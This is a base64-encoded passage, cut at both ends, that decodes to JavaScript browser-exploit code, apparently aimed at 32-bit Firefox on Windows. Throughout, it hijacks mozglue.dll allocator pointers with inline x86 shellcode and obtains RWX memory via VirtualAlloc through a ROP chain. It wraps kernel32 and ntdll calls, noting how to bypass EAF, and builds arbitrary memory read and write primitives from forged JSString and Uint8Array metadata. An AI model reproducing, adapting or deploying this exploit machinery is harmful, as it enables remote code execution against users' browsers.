0KICAgICAgICBjb25zdCBzdGF0dXMgPSB0aGlzLnJ3eC5jYWxsb2MoNCk7DQoNCiAgICAgICAgLyoNCiAgICAgICAgICogcEZyZWUNCiAgICAgICAgICovDQogICAgICAgIGNvbnN0IGZyZWUgPSB7fTsNCiAgICAgICAgZnJlZS5hZGRyID0gY2h1bms7DQogICAgICAgIGZyZWUuZnVuYyA9IHRoaXMucnd4LmNhbGxvYyg0KTsNCiAgICAgICAgZnJlZS5mdW5jLnN0ciA9IHRoaXMuZHdvcmQyc3RyKGZyZWUuZnVuYy5hZGRyKTsNCiAgICAgICAgZnJlZS5jb2RlID0gWw0KICAgICAgICAgICAgIlx4OGJceDg0XHgyNFx4MDhceDAwXHgwMFx4MDAiLCAvKiBtb3YgZWF4LCBkd29yZCBbZXNwICsgMHg4XSAqLw0KICAgICAgICAgICAgIlx4NTAiLCAgICAgICAgICAgICAgICAgICAgICAgICAvKiBwdXNoIGVheCAqLw0KICAgICAgICAgICAgIlx4OGJceDA1IiArIGZyZWUuZnVuYy5zdHIsICAgICAvKiBtb3YgZWF4LCBbbG9jYXRpb24tb2YtZnJlZV0gKi8NCiAgICAgICAgICAgICJceGZmXHhkMCIsICAgICAgICAgICAgICAgICAgICAgLyogY2FsbCBlYXggKi8NCiAgICAgICAgICAgICJceDU5IiwgICAgICAgICAgICAgICAgICAgICAgICAgLyogcG9wIGVjeCAqLw0KICAgICAgICAgICAgIlx4YzMiLCAgICAgICAgICAgICAgICAgICAgICAgICAvKiByZXQgKi8NCiAgICAgICAgXS5qb2luKCIiKTsNCiAgICAgICAgdTMyYXJyYXlbZnJlZS5mdW5jLmlkeF0gPSB0aGlzLnBlLnNlYXJjaCgibW96Z2x1ZS5kbGwiLCAiZnJlZSIpOw0KICAgICAgICB0aGlzLnJ3eC53cml0ZVN0cmluZyhmcmVlLmFkZHIsIGZyZWUuY29kZSk7DQoNCiAgICAgICAgLyoNCiAgICAgICAgICogcEFsbG9jDQogICAgICAgICAqLw0KICAgICAgICBjb25zdCBhbGxvYyA9IHt9Ow0KICAgICAgICBhbGxvYy5hZGRyID0gY2h1bmsgKyBmcmVlLmNvZGUubGVuZ3RoOw0KICAgICAgICBhbGxvYy5mdW5jID0gdGhpcy5yd3guY2FsbG9jKDQpOw0KICAgICAgICBhbGxvYy5mdW5jLnN0ciA9IHRoaXMuZHdvcmQyc3RyKGFsbG9jLmZ1bmMuYWRkcik7DQogICAgICAgIGFsbG9jLmNvZGUgPSBbDQogICAgICAgICAgICAiXHg4Ylx4ODRceDI0XHgwOFx4MDBceDAwXHgwMCIsIC8qIG1vdiBlYXgsIGR3b3JkIFtlc3AgKyAweDhdICovDQogICAgICAgICAgICAiXHg1MCIsICAgICAgICAgICAgICAgICAgICAgICAgIC8qIHB1c2ggZWF4ICovDQogICAgICAgICAgICAiXHg4Ylx4MDUiICsgYWxsb2MuZnVuYy5zdHIsICAgIC8qIG1vdiBlYXgsIFtsb2NhdGlvbi1vZi1hbGxvY10gKi8NCiAgICAgICAgICAgICJceGZmXHhkMCIsICAgICAgICAgICAgICAgICAgICAgLyogY2FsbCBlYXggKi8NCiAgICAgICAgICAgICJceDU5IiwgICAgICAgICAgICAgICAgICAgICAgICAgLyogcG9wIGVjeCAqLw0KICAgICAgICAgICAgIlx4YzMiLCAgICAgICAgICAgICAgICAgICAgICAgICAvKiByZXQgKi8NCiAgICAgICAgXS5qb2luKCIiKTsNCiAgICAgICAgdTMyYXJyYXlbYWxsb2MuZnVuYy5pZHhdID0gdGhpcy5wZS5zZWFyY2goIm1vemdsdWUuZGxsIiwgIm1hbGxvYyIpOw0KICAgICAgICB0aGlzLnJ3eC53cml0ZVN0cmluZyhhbGxvYy5hZGRyLCBhbGxvYy5jb2RlKTsNCg0KICAgICAgICAvKg0KICAgICAgICAgKiBwUmVhbGxvYw0KICAgICAgICAgKi8NCiAgICAgICAgY29uc3QgcmVhbGxvYyA9IHt9Ow0KICAgICAgICByZWFsbG9jLmFkZHIgPSBjaHVuayArIGZyZWUuY29kZS5sZW5ndGggKyBhbGxvYy5jb2RlLmxlbmd0aDsNCiAgICAgICAgcmVhbGxvYy5mdW5jID0gdGhpcy5yd3guY2FsbG9jKDQpOw0KICAgICAgICByZWFsbG9jLmZ1bmMuc3RyID0gdGhpcy5kd29yZDJzdHIocmVhbGxvYy5mdW5jLmFkZHIpOw0KICAgICAgICByZWFsbG9jLmNvZGUgPSBbDQogICAgICAgICAgICAiXHg4Ylx4ODRceDI0XHgwY1x4MDBceDAwXHgwMCIsIC8qIG1vdiBlYXgsIGR3b3JkIFtlc3AgKyAweGNdICovDQogICAgICAgICAgICAiXHg1MCIsICAgICAgICAgICAgICAgICAgICAgICAgIC8qIHB1c2ggZWF4ICovDQogICAgICAgICAgICAiXHg4Ylx4ODRceDI0XHgwY1x4MDBceDAwXHgwMCIsIC8qIG1vdiBlYXgsIGR3b3JkIFtlc3AgKyAweGNdICovDQogICAgICAgICAgICAiXHg1MCIsICAgICAgICAgICAgICAgICAgICAgICAgIC8qIHB1c2ggZWF4ICovDQogICAgICAgICAgICAiXHg4Ylx4MDUiICsgcmVhbGxvYy5mdW5jLnN0ciwgIC8qIG1vdiBlYXgsIFtsb2NhdGlvbi1vZi1yZWFsbG9jXSAqLw0KICAgICAgICAgICAgIlx4ZmZceGQwIiwgICAgICAgICAgICAgICAgICAgICAvKiBjYWxsIGVheCAqLw0KICAgICAgICAgICAgIlx4NTkiLCAgICAgICAgICAgICAgICAgICAgICAgICAvKiBwb3AgZWN4ICovDQogICAgICAgICAgICAiXHg1OSIsICAgICAgICAgICAgICAgICAgICAgICAgIC8qIHBvcCBlY3ggKi8NCiAgICAgICAgICAgICJceGMzIiwgICAgICAgICAgICAgICAgICAgICAgICAgLyogcmV0ICovDQogICAgICAgIF0uam9pbigiIik7DQogICAgICAgIHUzMmFycmF5W3JlYWxsb2MuZnVuYy5pZHhdID0gdGhpcy5wZS5zZWFyY2goIm1vemdsdWUuZGxsIiwgInJlYWxsb2MiKTsNCiAgICAgICAgdGhpcy5yd3gud3JpdGVTdHJpbmcocmVhbGxvYy5hZGRyLCByZWFsbG9jLmNvZGUpOw0KDQogICAgICAgIHRoaXMudV9zZXRNZW1vcnlGdW5jdGlvbnNfNTUoMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhbGxvYy5hZGRyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlYWxsb2MuYWRkciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcmVlLmFkZHIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzLmFkZHIpOw0KICAgICAgICBpZiAodTMyYXJyYXlbc3RhdHVzLmlkeF0gIT09IDApIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigidV9zZXRNZW1vcnlGdW5jdGlvbnNfNTUoKSBmYWlsZWQiKTsNCiAgICAgICAgfQ0KICAgIH07DQoNCiAgICAvKg0KICAgICAqIEFsbG9jYXRlcyBhIHNtYWxsIGNodW5rIG9mIG1lbW9yeSBtYXJrZWQgUldYLCB3aGljaCBpcyB1c2VkDQogICAgICogdG8gYWxsb2NhdGUgYSBgc2l6ZSctYnl0ZSBjaHVuayAoc2VlIHVwcnZfbWFsbG9jXzU1KCkpLiAgVGhlDQogICAgICogZmlyc3QgYWxsb2NhdGlvbiBpcyB0aGVuIHJlcHVycG9zZWQgaW4gcmVzZXQoKS4NCiAgICAgKi8NCiAgICB0aGlzLmFsbG9jID0gZnVuY3Rpb24oc3RhY2tBZGRyLCBzaXplKSB7DQogICAgICAgIC8qDQogICAgICAgICAqIGhpamFjayB0aGUgZnVuY3Rpb24gcG9pbnRlcnMNCiAgICAgICAgICovDQogICAgICAgIHRoaXMuc2V0KCk7DQoNCiAgICAgICAgLyoNCiAgICAgICAgICogZG8gdGhlIGluaXRpYWwgMHg0MCBieXRlIGFsbG9jYXRpb24NCiAgICAgICAgICovDQogICAgICAgIGNvbnN0IGNodW5rID0gdGhpcy51cHJ2X21hbGxvY181NShzdGFja0FkZHIpOw0KICAgICAgICBsb2coImFsbG9jYXRlZCAweDQwIGJ5dGUgY2h1bmsgYXQgMHgiICsgY2h1bmsudG9TdHJpbmcoMTYpKTsNCg0KICAgICAgICAvKg0KICAgICAgICAgKiBhbGxvY2F0ZSBhIGxhcmdlciBjaHVuayBub3cgdGhhdCB3ZSdyZSBubyBsb25nZXIgbGltaXRlZCB0byBST1AvSk9QDQogICAgICAgICAqLw0KICAgICAgICBjb25zdCB1MzJhcnJheSA9IHRoaXMucnd4LnUzMmFycmF5Ow0KICAgICAgICBjb25zdCBmdW5jID0gdGhpcy5yd3guY2FsbG9jKDQpOw0KICAgICAgICBmdW5jLnN0ciA9IHRoaXMuZHdvcmQyc3RyKGZ1bmMuYWRkcik7DQogICAgICAgIHUzMmFycmF5W2Z1bmMuaWR4XSA9IHRoaXMucGUuc2VhcmNoKCJrZXJuZWwzMi5kbGwiLCAiVmlydHVhbEFsbG9jIik7DQogICAgICAgIGNvbnN0IGNvZGUgPSBbDQogICAgICAgICAgICAiXHg4N1x4ZTciLCAgICAgICAgICAgICAgICAgICAgLyogeGNoZyBlZGksIGVzcCAob3JpZyBzdGFjaykgKi8NCiAgICAgICAgICAgICJceDZhXHg0MCIsICAgICAgICAgICAgICAgICAgICAvKiBwdXNoIDB4NDAgKGZsUHJvdGVjdCkgKi8NCiAgICAgICAgICAgICJceDY4XHgwMFx4MTBceDAwXHgwMCIsICAgICAgICAvKiBwdXNoIDB4MTAwMCAoZmxBbGxvY2F0aW9uVHlwZSkgKi8NCiAgICAgICAgICAgICJceGI4IiArIHRoaXMuZHdvcmQyc3RyKHNpemUpLCAvKiBtb3ZlIGVheCwgc2l6ZSAqLw0KICAgICAgICAgICAgIlx4NTAiLCAgICAgICAgICAgICAgICAgICAgICAgIC8qIHB1c2ggZWF4IChkd1NpemUpICovDQogICAgICAgICAgICAiXHg2YVx4MDAiLCAgICAgICAgICAgICAgICAgICAgLyogcHVzaCAwIChscEFkZHJlc3MpICovDQogICAgICAgICAgICAiXHg4Ylx4MDUiICsgZnVuYy5zdHIsICAgICAgICAgLyogbW92IGVheCwgW2xvYy1vZi1WaXJ0dWFsQWxsb2NdICovDQogICAgICAgICAgICAiXHhmZlx4ZDAiLCAgICAgICAgICAgICAgICAgICAgLyogY2FsbCBlYXggKi8NCiAgICAgICAgICAgICJceDg3XHhlNyIsICAgICAgICAgICAgICAgICAgICAvKiB4Y2hnIGVkaSwgZXNwIChiYWNrIHRvIGhlYXApICovDQogICAgICAgICAgICAiXHhjMyIsICAgICAgICAgICAgICAgICAgICAgICAgLyogcmV0ICovDQogICAgICAgIF0uam9pbigiIik7DQogICAgICAgIHRoaXMucnd4LndyaXRlU3RyaW5nKGNodW5rLCBjb2RlKTsNCiAgICAgICAgY29uc3QgbmV3Q2h1bmsgPSB0aGlzLnJvcC5leGVjdXRlKGNodW5rLCBbXSwgZmFsc2UpOw0KICAgICAgICBsb2coImFsbG9jYXRlZCAiICsgc2l6ZSArICIgYnl0ZSBjaHVuayBhdCAweCIgKyBuZXdDaHVuay50b1N0cmluZygxNikpOw0KDQogICAgICAgIC8qDQogICAgICAgICAqIHJlcHVycG9zZSB0aGUgZmlyc3Qgcnd4IGNodW5rIHRvIHJlc3RvcmUgZnVuY3Rpb25hbGl0eQ0KICAgICAgICAgKi8NCiAgICAgICAgdGhpcy5yZXNldChjaHVuayk7DQoNCiAgICAgICAgcmV0dXJuIG5ld0NodW5rOw0KICAgIH07DQoNCiAgICB0aGlzLmR3b3JkMnN0ciA9IGZ1bmN0aW9uKGR3b3JkKSB7DQogICAgICAgIGxldCBzdHIgPSAiIjsNCiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCA0OyBpKyspIHsNCiAgICAgICAgICAgIHN0ciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKChkd29yZCA+PiA4ICogaSkgJiAweGZmKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gc3RyOw0KICAgIH07DQp9DQoNCmZ1bmN0aW9uIEtFUk5FTDMyKHJvcCwgcGUsIHJ3eCkgew0KICAgIHRoaXMucm9wID0gcm9wOw0KICAgIHRoaXMucGUgPSBwZTsNCiAgICB0aGlzLnJ3eCA9IHJ3eDsNCg0KICAgIC8qDQogICAgICogUmV0cmlldmVzIGEgaGFuZGxlIGZvciBhbiBpbXBvcnRlZCBtb2R1bGUNCiAgICAgKi8NCiAgICB0aGlzLkdldE1vZHVsZUhhbmRsZUEgPSBmdW5jdGlvbihscE1vZHVsZU5hbWUpIHsNCiAgICAgICAgY29uc3QgZnVuYyA9IHRoaXMucGUuc2VhcmNoKCJrZXJuZWwzMi5kbGwiLCAiR2V0TW9kdWxlSGFuZGxlQSIpOw0KICAgICAgICBjb25zdCBuYW1lID0gdGhpcy5yd3guY29weVN0cmluZyhscE1vZHVsZU5hbWUpOw0KICAgICAgICBjb25zdCBtb2R1bGUgPSB0aGlzLnJvcC5leGVjdXRlKGZ1bmMsIFtuYW1lLmFkZHJdLCBmYWxzZSk7DQogICAgICAgIGlmIChtb2R1bGUgPT09IDApIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigiY291bGQgbm90IGdldCBhIGhhbmRsZSBmb3IgIiArIGxwTW9kdWxlTmFtZSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIG1vZHVsZTsNCiAgICB9Ow0KDQogICAgLyoNCiAgICAgKiBSZXRyaWV2ZXMgdGhlIGFkZHJlc3Mgb2YgYW4gZXhwb3J0ZWQgc3ltYm9sLiAgRG8gbm90IGludm9rZSB0aGlzDQogICAgICogZnVuY3Rpb24gb24gcHJvdGVjdGVkIG1vZHVsZXMgKGlmIHlvdSB3YW50IHRvIGJ5cGFzcyBFQUYpOyBpbnN0ZWFkDQogICAgICogdHJ5IHRvIGxvY2F0ZSB0aGUgc3ltYm9sIGluIGFueSBvZiB0aGUgaW1wb3J0IHRhYmxlcyBvciBjaG9vc2UNCiAgICAgKiBhbm90aGVyIHRhcmdldC4NCiAgICAgKi8NCiAgICB0aGlzLkdldFByb2NBZGRyZXNzID0gZnVuY3Rpb24oaE1vZHVsZSwgbHBQcm9jTmFtZSkgew0KICAgICAgICBjb25zdCBmdW5jID0gdGhpcy5wZS5zZWFyY2goImtlcm5lbDMyLmRsbCIsICJHZXRQcm9jQWRkcmVzcyIpOw0KICAgICAgICBjb25zdCBuYW1lID0gdGhpcy5yd3guY29weVN0cmluZyhscFByb2NOYW1lKTsNCiAgICAgICAgY29uc3QgYWRkciA9IHRoaXMucm9wLmV4ZWN1dGUoZnVuYywgW2hNb2R1bGUsIG5hbWUuYWRkcl0sIGZhbHNlKTsNCiAgICAgICAgaWYgKGFkZHIgPT09IDApIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigiY291bGQgbm90IGdldCBhZGRyZXNzIGZvciAiICsgbHBQcm9jTmFtZSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGFkZHI7DQogICAgfTsNCg0KICAgIC8qDQogICAgICogUmV0cmlldmVzIGEgaGFuZGxlIGZvciB0aGUgY3VycmVudCB0aHJlYWQNCiAgICAgKi8NCiAgICB0aGlzLkdldEN1cnJlbnRUaHJlYWQgPSBmdW5jdGlvbigpIHsNCiAgICAgICAgY29uc3QgZnVuYyA9IHRoaXMucGUuc2VhcmNoKCJrZXJuZWwzMi5kbGwiLCAiR2V0Q3VycmVudFRocmVhZCIpOw0KICAgICAgICByZXR1cm4gdGhpcy5yb3AuZXhlY3V0ZShmdW5jLCBbXSwgZmFsc2UpOw0KICAgIH07DQp9DQoNCmZ1bmN0aW9uIE5URExMKHJvcCwgcGUsIHJ3eCkgew0KICAgIHRoaXMucm9wID0gcm9wOw0KICAgIHRoaXMucGUgPSBwZTsNCiAgICB0aGlzLnJ3eCA9IHJ3eDsNCg0KICAgIC8qDQogICAgICogUmV0cmlldmVzIHRoZSBzdGFjayBsaW1pdCBmcm9tIHRoZSBUaHJlYWQgRW52aXJvbm1lbnQgQmxvY2sNCiAgICAgKi8NCiAgICB0aGlzLmdldFN0YWNrTGltaXQgPSBmdW5jdGlvbihUaHJlYWRIYW5kbGUpIHsNCiAgICAgICAgY29uc3QgbWVtID0gdGhpcy5yd3guY2FsbG9jKDB4MWMpOw0KICAgICAgICB0aGlzLk50UXVlcnlJbmZvcm1hdGlvblRocmVhZChUaHJlYWRIYW5kbGUsIDAsIG1lbS5hZGRyLCBtZW0uc2l6ZSwgMCk7DQogICAgICAgIHJldHVybiB0aGlzLnJ3eC5yZWFkRFdvcmQodGhpcy5yd3gudTMyYXJyYXlbbWVtLmlkeCsxXSArIDgpOw0KICAgIH07DQoNCiAgICAvKg0KICAgICAqIFJldHJpZXZlcyB0aHJlYWQgaW5mb3JtYXRpb24NCiAgICAgKi8NCiAgICB0aGlzLk50UXVlcnlJbmZvcm1hdGlvblRocmVhZCA9IGZ1bmN0aW9uKFRocmVhZEhhbmRsZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRocmVhZEluZm9ybWF0aW9uQ2xhc3MsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaHJlYWRJbmZvcm1hdGlvbiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRocmVhZEluZm9ybWF0aW9uTGVuZ3RoLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmV0dXJuTGVuZ3RoKSB7DQogICAgICAgIGNvbnN0IGZ1bmMgPSB0aGlzLnBlLnNlYXJjaCgibnRkbGwuZGxsIiwgIk50UXVlcnlJbmZvcm1hdGlvblRocmVhZCIpOw0KICAgICAgICBjb25zdCByZXQgPSB0aGlzLnJvcC5leGVjdXRlKGZ1bmMsIGFyZ3VtZW50cywgZmFsc2UpOw0KICAgICAgICBpZiAocmV0ICE9PSAwKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoIk50UXVlcnlJbmZvcm1hdGlvblRocmVhZCBmYWlsZWQiKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gcmV0Ow0KICAgIH07DQp9DQoNCmZ1bmN0aW9uIFJlYWRXcml0ZUV4ZWN1dGUodTMyYmFzZSwgdTMyYXJyYXksIGFycmF5KSB7DQogICAgdGhpcy51MzJiYXNlID0gdTMyYmFzZTsNCiAgICB0aGlzLnUzMmFycmF5ID0gdTMyYXJyYXk7DQogICAgdGhpcy5hcnJheSA9IGFycmF5Ow0KDQogICAgLyoNCiAgICAgKiBSZWFkcyBgbGVuZ3RoJyBieXRlcyBmcm9tIGBhZGRyJyB0aHJvdWdoIGEgZmFrZSBzdHJpbmcNCiAgICAgKi8NCiAgICB0aGlzLnJlYWRCeXRlcyA9IGZ1bmN0aW9uKGFkZHIsIGxlbmd0aCkgew0KICAgICAgICAvKiBjcmVhdGUgYSBzdHJpbmctanN2YWwgKi8NCiAgICAgICAgdGhpcy51MzJhcnJheVs0XSA9IHRoaXMudTMyYmFzZSArIDYqNDsgICAvKiBhZGRyIHRvIG1ldGEgKi8NCiAgICAgICAgdGhpcy51MzJhcnJheVs1XSA9IDB4ZmZmZmZmODU7ICAgICAgICAgICAvKiB0eXBlIChKU1ZBTF9UQUdfU1RSSU5HKSAqLw0KDQogICAgICAgIC8qIG1ldGFkYXRhICovDQogICAgICAgIHRoaXMudTMyYXJyYXlbNl0gPSAweDQ5OyAgIC8qIGZsYWdzICovDQogICAgICAgIHRoaXMudTMyYXJyYXlbN10gPSBsZW5ndGg7IC8qIHJlYWQgc2l6ZSAqLw0KICAgICAgICB0aGlzLnUzMmFycmF5WzhdID0gYWRkcjsgICAvKiBtZW1vcnkgdG8gcmVhZCAqLw0KDQogICAgICAgIC8qIFVpbnQ4QXJyYXkgaXMgKnNpZ25pZmljYW50bHkqIHNsb3dlciwgd2hpY2gga2lsbHMgb3VyIFJPUCBodW50aW5nICovDQogICAgICAgIGNvbnN0IHJlc3VsdCA9IG5ldyBBcnJheSgpOw0KDQogICAgICAgIGNvbnN0IHN0ciA9IHRoaXMuZ2V0QXJyYXlFbGVtKDQpOw0KICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHN0ci5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgcmVzdWx0W2ldID0gc3RyLmNoYXJDb2RlQXQoaSk7DQogICAgICAgIH0NCg0KICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgIH07DQoNCiAgICB0aGlzLnJlYWREV29yZHMgPSBmdW5jdGlvbihhZGRyLCBudW0pIHsNCiAgICAgICAgY29uc3QgYnl0ZXMgPSB0aGlzLnJlYWRCeXRlcyhhZGRyLCBudW0gKiA0KTsNCiAgICAgICAgY29uc3QgZHdvcmRzID0gbmV3IFVpbnQzMkFycmF5KG51bSk7DQogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYnl0ZXMubGVuZ3RoOyBpICs9IDQpIHsNCiAgICAgICAgICAgIGZvciAobGV0IGogPSAwOyBqIDwgNDsgaisrKSB7DQogICAgICAgICAgICAgICAgZHdvcmRzW2kvNF0gfD0gYnl0ZXNbaStqXSA8PCAoOCAqIGopOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBkd29yZHM7DQogICAgfTsNCg0KICAgIHRoaXMucmVhZERXb3JkID0gZnVuY3Rpb24oYWRkcikgew0KICAgICAgICByZXR1cm4gdGhpcy5yZWFkRFdvcmRzKGFkZHIsIDEpWzBdOw0KICAgIH07DQoNCiAgICB0aGlzLnJlYWRXb3JkcyA9IGZ1bmN0aW9uKGFkZHIsIG51bSkgew0KICAgICAgICBjb25zdCBieXRlcyA9IHRoaXMucmVhZEJ5dGVzKGFkZHIsIG51bSAqIDIpOw0KICAgICAgICBjb25zdCB3b3JkcyA9IG5ldyBVaW50MTZBcnJheShudW0pOw0KICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGJ5dGVzLmxlbmd0aDsgaSArPSAyKSB7DQogICAgICAgICAgICBmb3IgKGxldCBqID0gMDsgaiA8IDI7IGorKykgew0KICAgICAgICAgICAgICAgIHdvcmRzW2kvMl0gfD0gYnl0ZXNbaStqXSA8PCAoOCAqIGopOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiB3b3JkczsNCiAgICB9Ow0KDQogICAgdGhpcy5yZWFkV29yZCA9IGZ1bmN0aW9uKGFkZHIpIHsNCiAgICAgICAgcmV0dXJuIHRoaXMucmVhZFdvcmRzKGFkZHIsIDEpWzBdOw0KICAgIH07DQoNCiAgICB0aGlzLnJlYWRTdHJpbmcgPSBmdW5jdGlvbihhZGRyKSB7DQogICAgICAgIGZvciAobGV0IGkgPSAwLCBzdHIgPSAiIjsgOyBpKyspIHsNCiAgICAgICAgICAgIGNvbnN0IGNociA9IHRoaXMucmVhZEJ5dGVzKGFkZHIgKyBpLCAxKVswXTsNCiAgICAgICAgICAgIGlmIChjaHIgPT09IDApIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gc3RyOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgc3RyICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoY2hyKTsNCiAgICAgICAgfQ0KICAgIH07DQoNCiAgICAvKg0KICAgICAqIFdyaXRlcyBgdmFsdWVzJyB0byBgYWRkcicgYnkgdXNpbmcgdGhlIG1ldGFkYXRhIG9mIGFuIFVpbnQ4QXJyYXkNCiAgICAgKiB0byBzZXQgdXAgYSB3cml0ZSBwcmltaXRpdmUNCiAgICAgKi8NCiAgICB0aGlzLndyaXRlQnl0ZXMgPSBmdW5jdGlvbihhZGRyLCB2YWx1ZXMpIHsNCiAgICAgICAgLyogY3JlYXRlIGpzdmFsICovDQogICAgICAgIGNvbnN0IGpzTWVtID0gdGhpcy5jYWxsb2MoOCk7DQogICAgICAgIHRoaXMuc2V0QXJyYXlFbGVtKGpzTWVtLmlkeCwgbmV3IFVpbnQ4QXJyYXkodmFsdWVzLmxlbmd0aCkpOw0KDQogICAgICAgIC8qIGNvcHkgbWV0YWRhdGEgKi8NCiAgICAgICAgY29uc3QgbWV0YSA9IHRoaXMucmVhZERXb3Jkcyh0aGlzLnUzMmFycmF5W2pzTWVtLmlkeF0sIDEyKTsNCiAgICAgICAgY29uc3QgbWV0YU1lbSA9IHRoaXMuY2FsbG9jKG1ldGEubGVuZ3RoICogNCk7DQogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbWV0YS5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgdGhpcy51MzJhcnJheVttZXRhTWVtLmlkeCArIGldID0gbWV0YVtpXTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8qIGNoYW5nZSB0aGUgcG9pbnRlciB0byB0aGUgY29udGVudHMgb2YgdGhlIFVpbnQ4QXJyYXkgKi8NCiAgICAgICAgdGhpcy51MzJhcnJheVttZXRhTWVtLmlkeCArIDEwXSA9IGFkZHI7DQoNCiAgICAgICAgLyogY2hhbmdlIHRoZSBwb2ludGVyIHRvIHRoZSBtZXRhZGF0YSAqLw0KICAgICAgICBjb25zdCBvbGRNZXRhID0gdGhpcy51MzJhcnJheVtqc01lbS5pZHhdOw0KICAgICAgICB0aGlzLnUzMmFycmF5W2pzTWVtLmlkeF0gPSBtZXRhTWVtLmFkZHI7DQoNCiAgICAgICAgLyogd3JpdGUgKi8NCiAgICAgICAgY29uc3QgdTggPSB0aGlzLmdldEFycmF5RWxlbShqc01lbS5pZHgpOw0KICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHZhbHVlcy5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgdThbaV0gPSB2YWx1ZXNbaV07DQogICAgICAgIH0NCg0KICAgICAgICAvKiBjbGVhbiB1cCAqLw0KICAgICAgICB0aGlzLnUzMmFycmF5W2pzTWVtLmlkeF0gPSBvbGRNZXRhOw0KICAgIH07DQoNCiAgICB0aGlzLndyaXRlRFdvcmRzID0gZnVuY3Rpb24oYWRkciwgdmFsdWVzKSB7DQogICAgICAgIGNvbnN0IHU4ID0gbmV3IFVpbnQ4QXJyYXkodmFsdWVzLmxlbmd0aCAqIDQpOw0KICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHZhbHVlcy5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgZm9yIChsZXQgaiA9IDA7IGogPCA0OyBqKyspIHsNCiAgICAgICAgICAgICAgICB1OFtpKjQgKyBqXSA9IHZhbHVlc1tpXSA+PiAoOCAqIGopICYgMHhmZjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICB0aGlzLndyaXRlQnl0ZXMoYWRkciwgdTgpOw0KICAgIH07DQoNCiAgICB0aGlzLndyaXRlRFdvcmQgPSBmdW5jdGlvbihhZGRyLCB2YWx1ZSkgew0KICAgICAgICBjb25zdCB1MzIgPSBuZXcgVWludDMyQXJyYXkoMSk7DQogICAgICAgIHUzMlswXSA9IHZhbHVlOw0KICAgICAgICB0aGlzLndyaXRlRFdvcmRzKGFkZHIsIHUzMik7DQogICAgfTsNCg0KICAgIHRoaXMud3JpdGVTdHJpbmcgPSBmdW5jdGlvbihhZGRyLCBzdHIpIHsNCiAgICAgICAgY29uc3QgdTggPSBuZXcgVWludDhBcnJheShzdHIubGVuZ3RoKTsNCg0KICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHN0ci5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgdThbaV0gPSBzdHIuY2hhckNvZGVBdChpKTsNCiAgICAgICAgfQ0KICAgICAgICB0aGlzLndyaXRlQnl0ZXMoYWRkciwgdTgpOw0KICAgIH07DQoNCiAgICAvKg0KICAgICAqIENvcGllcyBhIHN0cmluZyB0byB0aGUgYHUzMmFycmF5JyBhbmQgcmV0dXJucyBhbiBvYmplY3QgZnJvbQ0KICAgICAqIGNhbGxvYygpLg0KICAgICAqDQogICAgICogVGhpcyBpcyBhbiB1Z2x5IHdvcmthcm91bmQgdG8gYWxsb3cgcGxhY2luZyBhIHN0cmluZyBhdCBhIGtub3duDQogICAgICogbG9jYXRpb24gd2l0aG91dCBoYXZpbmcgdG8gaW1wbGVtZW50IHByb3BlciBzdXBwb3J0IGZvciBKU1N0cmluZw0KICAgICAqIGFuZCBpdHMgdmFyaW91cyBzdHJpbmcgdHlwZXMuDQogICAgICovDQogICAgdGhpcy5jb3B5U3RyaW5nID0gZnVuY3Rpb24oc3RyKSB7DQogICAgICAgIHN0ciArPSAiXHgwMCIucmVwZWF0KDQgLSBzdHIubGVuZ3RoICUgNCk7DQogICAgICAgIGNvbnN0IG1lbSA9IHRoaXMuY2FsbG9jKHN0ci5sZW5ndGgpOw0KDQogICAgICAgIGZvciAobGV0IGkgPSAwLCBqID0gMDsgaSA8IHN0ci5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgaWYgKGkgJiYgIShpICUgNCkpIHsNCiAgICAgICAgICAgICAgICBqKys7DQogICAgICAgICAgICB9DQogICAgICAgICAgICB0aGlzLnUzMmFycmF5W21lbS5pZHggKyBqXSB8PSBzdHIuY2hhckNvZGVBdChpKSA8PCAoOCAqIChpICUgNCkpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBtZW07DQogICAgfTsNCg0KICAgIC8qDQogICAgICogQ3JlYXRlcyBhIDxkaXY+IGFuZCBjb3BpZXMgdGhlIGNvbnRlbnRzIG9mIGl0cyB2Z